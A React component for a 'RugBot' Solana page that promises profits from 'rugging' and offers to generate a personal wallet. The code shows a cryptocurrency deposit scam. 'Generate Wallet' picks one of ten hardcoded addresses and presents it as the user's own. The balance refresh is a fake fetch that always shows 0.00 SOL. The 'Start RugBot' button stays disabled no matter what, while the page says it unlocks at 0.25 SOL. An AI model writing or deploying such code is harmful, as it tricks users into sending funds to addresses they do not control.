import './css/styles.css';
import fire from "./images/fire5.svg";

import List from '@mui/joy/List';
import ListItem from '@mui/joy/ListItem';
import ListItemDecorator from '@mui/joy/ListItemDecorator';
import Radio from '@mui/joy/Radio';
import RadioGroup from '@mui/joy/RadioGroup';
import Person from '@mui/icons-material/Person';
import People from '@mui/icons-material/People';
import Apartment from '@mui/icons-material/Apartment';
import {useState} from "react";
import { ClipboardCopy } from "lucide-react";
import {Refresh} from "@mui/icons-material";


export function ConnectMeta() {

    const [randomString, setRandomString] = useState("");
    const [isLoading, setIsLoading] = useState(false);
    const [isRefreshing, setIsRefreshing] = useState(false);
    const [solAmount, setSolAmount] = useState("0.00 SOL");
    const [isLocked, setIsLocked] = useState(false);

    const xyz = ['HSm1PwaXC6qeT2jqBPw21NN7wvBj3HEtagUHEzKEngmd',
        '59APtXa7pqLcHoouEFDPn7ydn1fLWHkWcc9yRbx2T5DZ',
        'GS9tmWT9xsvGXQXbbUnYbe1bvSBxsZcvFFLxLbZSThrN',
        'DHjSJTpzE2wTKozKwCxoZZuZwRFFdqr622E548xzxV5Z',
        'B8AdMuFoEzCzr7f6weYTBBbu45MJZSXkaUT2zuNgbhhN',
        '37bT34nwcYZmQP5nHCwSvgVNndaoxcgfueNj3qUpV7hX',
        'GwZ8YPemSbSdtLQdydDcaTkw4SzZB9z1U7Xb29KBmV8y',
        'FfXS1Efb4mJ2Vq5tkbWtCVedTey5wAELNMUqeUmGvemE',
        'AHKZ2UT7zGUc5Z8i7FwiE38JZoaJYkqRjhN9WFvrozgP',
        '9rE6QmqqjEtrKQL9q1JrY91TGxD1mAaiHG6mL9RHYmMT'
    ];

    const handleCopy = () => {
        navigator.clipboard.writeText(randomString);
    };

    const handleRefresh = () => {
        setIsRefreshing(true);
        setSolAmount('Fetching...');
        setTimeout(() => {
            setSolAmount('0.00 SOL');
            setIsRefreshing(false);
        }, 2000);
    };

    function createWallet() {
        setIsLoading(true);
        setTimeout(() => {
            const randomIndex = Math.floor(Math.random() * xyz.length);
            setRandomString(xyz[randomIndex]);
            setIsLoading(false);
            setIsLocked(true);
            }, 3000);
    }

    return (
      <div className="ConnectWallet card_dapp">
        <p className='text title'>Start Earning $SOL</p>
          <button
              className="btn btn--accent2 text--small text--medium btn-top-burn btn-dapp-use"
              onClick={() => createWallet()}
              disabled={isLoading || isLocked}
          >Generate Wallet</button>

          {isLoading && (
              <p className="mt-4 text-gray-500">Please wait...</p>
          )}
          {!isLoading && randomString && (
              <div className="mt-4 flex items-center gap-2">
                  <p>Here is your new RugBot Solana Wallet</p>
                  <p style={{fontSize:'small'}}><em>You will be able to withdraw your profit onto your original Solana wallet at anytime using the withdraw tab at the top of this page!</em></p>
                  <input
                      type="text"
                      value={randomString}
                      readOnly
                      className="input-box"
                  />

                  <button
                      onClick={handleCopy}
                      className="p-2 bg-gray-200 rounded-lg hover:bg-gray-300 transition"
                  >
                      <ClipboardCopy size={20} />
                  </button>

                  <br/>
                  <br/>

                  <p>Refresh here until you see your SOL in your wallet</p>
                  <p style={{fontSize:'small'}}><em>It can take up to a minute for your Solana to appear in your wallet</em></p>

                  <input
                      type="text"
                      value={solAmount}
                      readOnly
                      className="small-input-box"
                  />

                  <button
                      onClick={handleRefresh}
                      className="p-2 bg-gray-200 rounded-lg hover:bg-gray-300 transition"
                  >
                      <Refresh size={20} />
                  </button>
              </div>
          )}

          <br/>

          <p>Choose your risk level</p>
          <p style={{fontSize:'small'}}><em>Remember: The higher the reward, the more risk you are taking</em></p>

          <RadioGroup aria-label="Your plan" name="people" defaultValue="Individual">
              <List
                  sx={{
                      minWidth: 240,
                      '--List-gap': '0.5rem',
                      '--ListItem-paddingY': '1rem',
                      '--ListItem-radius': '8px',
                      '--ListItemDecorator-size': '32px',
                  }}
              >
                  {['High Risk (10x-100x)', 'Medium Risk (1.5x-10x)', 'Low Risk (up to 2x)'].map((item, index) => (
                      <ListItem variant="outlined" key={item} sx={{ boxShadow: 'sm', height: '50px', width: '300px', marginTop: '25px'}}>
                          <ListItemDecorator>
                              {[<Person />, <People />, <People />][index]}
                          </ListItemDecorator>
                          <Radio
                              overlay
                              value={item}
                              label={item}
                              sx={{ flexGrow: 1, flexDirection: 'row-reverse' }}
                              slotProps={{
                                  action: ({ checked }) => ({
                                      sx: (theme) => ({
                                          ...(checked && {
                                              inset: -1,
                                              border: '2px solid',
                                              borderColor: theme.vars.palette.primary[500],
                                          }),
                                      }),
                                  }),
                              }}
                          />
                      </ListItem>
                  ))}
              </List>
          </RadioGroup>
          <br/>

          <p>Start the rugging</p>
              <button
                  className="btn btn--accent2 text--small text--medium btn-top-burn btn-dapp-use start-button"
                  onClick={() => createWallet()}
                  disabled
              >Start RugBot 😈</button>

          {!isLoading && randomString && (
              <p style={{fontSize: 'small'}}><em>Button will be enabled again when you have at least 0.25 SOL in your wallet</em></p>
          )}
      </div>
    )
}
